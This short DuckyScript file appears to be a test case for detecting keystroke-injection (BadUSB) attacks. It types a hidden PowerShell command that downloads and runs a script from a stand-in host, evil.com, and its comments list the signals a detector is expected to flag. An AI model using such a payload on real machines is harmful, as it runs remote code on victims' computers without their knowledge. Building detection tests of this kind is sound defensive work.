DELAY 100
GUI r
DELAY 50
STRING powershell -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
ENTER

REM Expected Detection:
REM - Speed anomaly (fast consistent typing)
REM - Pattern match: WIN+R, "powershell", "-WindowStyle Hidden", "IEX", "DownloadString"
REM - High-risk command sequence
REM - Run dialog context (high risk)
REM - Zero error rate

REM Detection Confidence: Expected >0.95 (multiple high-risk signals)
